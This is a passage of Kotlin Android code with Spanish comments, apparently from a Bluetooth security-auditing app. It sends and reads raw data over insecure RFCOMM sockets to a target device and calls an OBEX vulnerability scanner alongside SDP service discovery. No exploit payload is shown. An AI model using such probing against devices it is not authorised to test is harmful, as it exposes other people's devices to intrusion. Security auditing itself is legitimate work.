     * El escaneo BLE iniciado en handleStartScan se auto-finaliza a los 8s;
     * si no hay discovery activo se reporta wasScanning=false sin fabricar nada.
     */
    private fun handleStopScan(result: MethodChannel.Result) {
        try {
            val adapter = BluetoothAdapter.getDefaultAdapter()
            val wasScanning = adapter?.isDiscovering == true
            if (wasScanning) adapter?.cancelDiscovery()
            result.success(mapOf("success" to wasScanning, "wasScanning" to wasScanning))
        } catch (e: Exception) {
            result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
        }
    }

    /**
     * Envía bytes/string por RFCOMM SPP real al dispositivo objetivo.
     * Acepta {@code data} como ByteArray, List<Int> o String.
     */
    private fun handleSendData(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        val data = call.argument<ByteArray>("data")
            ?: call.argument<List<Int>>("data")?.map { it.toByte() }?.toByteArray()
            ?: call.argument<String>("data")?.toByteArray(Charsets.UTF_8)
            ?: call.argument<String>("command")?.toByteArray(Charsets.UTF_8)
            ?: byteArrayOf(0x00)
        executor.submit {
            try {
                val socket = device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(SPP_UUID))
                socket.connect()
                socket.outputStream.write(data)
                socket.close()
                result.success(true)
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
            }
        }
    }

    /**
     * Lee bytes disponibles por RFCOMM SPP durante {@code timeout} ms.
     * Uso de InputStream.available() + sleep (nunca read() bloqueante), devuelve
     * null si no hay datos (honesto, sin fabricar respuestas).
     */
    private fun handleReadData(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        val timeoutMs = (call.argument<Int>("timeout") ?: 3000).coerceIn(500, 15000)
        executor.submit {
            var socket: BluetoothSocket? = null
            try {
                socket = device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(SPP_UUID))
                socket!!.connect()
                val deadline = System.currentTimeMillis() + timeoutMs
                val sb = StringBuilder()
                while (System.currentTimeMillis() < deadline) {
                    val avail = try { socket!!.inputStream.available() } catch (_: Exception) { 0 }
                    if (avail > 0) {
                        val buf = ByteArray(avail.coerceAtMost(1024))
                        val n = socket!!.inputStream.read(buf)
                        if (n > 0) sb.append(String(buf, 0, n, Charsets.UTF_8)) else break
                    } else {
                        Thread.sleep(100)
                    }
                }
                result.success(if (sb.isEmpty()) null else sb.toString())
            } catch (e: Exception) {
                result.success(null)
            } finally {
                try { socket?.close() } catch (_: Exception) {}
            }
        }
    }

    /**
     * Análisis de seguridad real: estado de bonding + servicios SDP + análisis OBEX.
     * Devuelve únicamente hechos observables, sin puntuaciones fabricadas.
     */
    private fun handleAnalyzeSecurity(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            try {
                val sdp = MissingClasses.SDPServiceDiscovery.discoverServices(device)
                val services = (sdp["services"] as? List<Map<String, Any>>) ?: emptyList()
                val obex = OBEXVulnerabilityAnalyzer.scanOBEXVulnerabilities(device)
                result.success(
                    mapOf(
                        "success" to true,
                        "bondState" to device.bondState,
                        "isBonded" to (device.bondState == BluetoothDevice.BOND_BONDED),
                        "services" to services,
                        "obexAnyVulnerable" to (obex["anyVulnerable"] == true),
                        "obexDetails" to obex
                    )
                )
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
            }
        }
    }

    private fun handleEnableBluetooth(result: MethodChannel.Result) {
        val adapter = BluetoothAdapter.getDefaultAdapter()
        if (adapter == null) {
            result.success(false)
            return
        }
        result.success(adapter.isEnabled || adapter.enable())
    }

    private fun handleDisableBluetooth(result: MethodChannel.Result) {
        val adapter = BluetoothAdapter.getDefaultAdapter()
        result.success(adapter?.disable() == true)
    }

    private fun handleGetBluetoothStatus(result: MethodChannel.Result) {
        val adapter = BluetoothAdapter.getDefaultAdapter()
        result.success(mapOf(
            "enabled" to (adapter?.isEnabled == true),
            "available" to (adapter != null),
            "name" to (adapter?.name ?: "Unknown")
        ))
    }
}